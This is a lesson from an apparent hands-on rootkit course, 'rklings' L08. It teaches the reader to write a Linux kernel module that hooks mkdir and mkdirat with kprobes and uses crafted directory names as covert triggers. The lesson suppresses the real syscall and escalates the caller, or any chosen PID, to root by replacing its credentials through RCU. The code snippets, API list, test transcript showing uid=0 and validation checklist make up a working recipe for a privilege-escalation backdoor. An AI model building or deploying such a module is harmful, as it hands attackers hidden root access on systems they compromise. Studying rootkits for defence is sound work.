# L08: Kprobe Revealed

Open `rklings_hook.h`.
Read every line.
Then delete it and rewrite mkdir interception from scratch using
`register_kprobe` directly.

## What kprobes are

Kprobes are the kernel's dynamic instrumentation framework.
You register a function name and a callback.
The kernel patches a breakpoint instruction at the function's entry point.
When that instruction executes, your callback runs with access to the CPU
registers.

```c
static struct kprobe rk_kprobe_mkdir = {
    .symbol_name = "__x64_sys_mkdir",
    .pre_handler = rk_pre_mkdir,
};

register_kprobe(&rk_kprobe_mkdir);
```

Your `pre_handler` receives `struct pt_regs *regs` holding the register state at
the moment the function was entered.
You can read arguments, modify state, or take action before the function runs.

## Reading the pathname

The pathname comes from userspace.
You need `strncpy_from_user` to copy it safely into a kernel buffer, then
`strrchr` to extract the basename:

```c
long strncpy_from_user(char *dst, const char __user *src, long count);

char buf[128];
strncpy_from_user(buf, pathname, sizeof(buf));
const char *base = strrchr(buf, '/');
base = base ? base + 1 : buf;
```

## Suppressing the real mkdir

After interception, you do not want the real mkdir to create a directory.
The `put_user('\0')` trick writes a null byte to the start of the userspace
pathname.
The real mkdir sees an empty string and fails harmlessly:

```c
put_user('\0', (char __user *)pathname);
```

## RCU credential replacement

For PID escalation, `commit_creds` only works on `current`.
To escalate a different process, replace its credentials directly via RCU:

```c
rcu_read_lock();
task = pid_task(find_vpid(pid), PIDTYPE_PID);
new_cred = prepare_kernel_cred(&init_task);
old_cred = task->real_cred;
rcu_assign_pointer(task->real_cred, new_cred);
rcu_assign_pointer(task->cred, new_cred);
rcu_read_unlock();
put_cred(old_cred);
```

```text
  mkdir("rklings.e")
       |
       v
  __x64_sys_mkdir(struct pt_regs *regs)
       |
    [kprobe fires]
       |
       v
  rk_pre_mkdir(kprobe, regs)
    1. extract inner pt_regs
    2. strncpy_from_user(pathname)
    3. strrchr for basename
    4. dispatch action
    5. put_user('\0') to suppress mkdir
```

## The trap

`__x64_sys_mkdir` is a syscall wrapper.
Its only argument is a `struct pt_regs *` holding the original register state.
Your kprobe's `pre_handler` also receives a `struct pt_regs *`, but that is the
kprobe trap frame.

You must dereference twice:

```c
// Step 1: get inner pt_regs (first argument to __x64_sys_mkdir)
struct pt_regs *uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);

// Step 2: read the actual syscall argument from inner regs
const char __user *pathname = (const char __user *)uregs->di;   // mkdir
const char __user *pathname = (const char __user *)uregs->si;   // mkdirat
```

If you read `regs->di` directly, you get garbage.
This double indirection applies to all `__x64_sys_*` functions.
Regular kernel functions like `ksys_read` do not have this wrapping.

## You write

`main.c` (~190 lines):

- two kprobes (`__x64_sys_mkdir` + `__x64_sys_mkdirat`)
- pathname extraction from inner `pt_regs`
- escalation (self + PID)
- deferred delivery via `/proc/rklings`

No `rklings_hook.h`.
Everything from scratch.

## API

```c
#include <linux/kprobes.h>

int register_kprobe(struct kprobe *p);
void unregister_kprobe(struct kprobe *p);

struct pt_regs *uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
long strncpy_from_user(char *dst, const char __user *src, long count);
int put_user(T val, T __user *ptr);

// RCU PID escalation
struct task_struct *pid_task(struct pid *pid, enum pid_type type);
struct pid *find_vpid(int nr);
void rcu_read_lock(void);
void rcu_read_unlock(void);
void rcu_assign_pointer(T *p, T *v);
void put_cred(const struct cred *cred);
```

## Test it

```
$ rklings run l08
root@vm:~# cat /sys/kernel/debug/kprobes/list
(two kprobes on __x64_sys_mkdir and __x64_sys_mkdirat)
root@vm:~# mkdir rklings.e && id
uid=0(root) gid=0(root) groups=0(root)
root@vm:~# dmesg | tail -1
rklings: mkdir e
```

Deferred PID delivery still works:

```
root@vm:~# mkdir rklings.e.$$
root@vm:~# cat /proc/rklings
deferred: <pid>
```

## Validate

```
$ rklings validate l08
  [+] module loads (no rklings_hook.h)
  [+] kprobe registered on __x64_sys_mkdir
  [+] kprobe registered on __x64_sys_mkdirat
  [+] dmesg shows intercepted command
  [+] self-escalation works
  [+] PID targeting works
  [+] deferred delivery via /proc/rklings
  PASS
```

## Next

Your kprobe fires before mkdir runs, but cannot control its return value.
L09 switches to a kretprobe, which fires on both entry and return, and adds a
command dispatcher.
